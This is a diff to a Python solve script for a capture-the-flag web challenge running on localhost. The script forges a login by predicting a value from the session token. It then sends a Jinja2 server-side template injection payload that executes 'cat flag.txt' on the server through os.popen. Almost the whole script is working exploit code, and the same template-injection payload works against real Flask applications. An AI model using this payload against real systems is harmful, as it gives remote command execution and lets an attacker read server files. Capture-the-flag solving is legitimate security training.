@@ -4,11 +4,14 @@ import requests
 import random
 import regex
 
-URL = "http://127.0.0.1:5173"
+URL = "http://127.0.0.1:8969"
+
+# Create a session
+session = requests.Session()
 
 # Get session cookie
-r = requests.get(URL)
-token = r.cookies['session']
+session.get(URL)
+token = session.cookies['session']
 
 # Split the payload from the signature
 payload = token.split(".")[0]
@@ -30,14 +33,13 @@ print("Token: " + token)
 print("Next Number: " + str(next_number))
 
 # Log in
-r = requests.post(URL + "/api/verify_truth",
-                  data={'guess': next_number}, cookies={'session': token})
-token = r.cookies['session']
+session.post(URL + "/api/verify_truth", data={'guess': next_number})
+token = session.cookies['session']
 
 print("Logged in token: " + token)
 
 # Part 2 Solve
-r = requests.get(URL + "/mini?ministry={{cycler.__init__.__globals__.os.popen(request.args.p).read()}}&p=cat%20flag.txt", cookies={'session': token})
-flag = regex.findall(r'LNC2024{.*}', r.text)[0]
+r = session.get(URL + "/mini?ministry={{cycler.__init__.__globals__.os.popen(request.args.p).read()}}&p=cat%20flag.txt", cookies={'session': token})
+flag = regex.findall(r'LNC24{.*}', r.text)[0]
 
 print("Solved: " + flag)
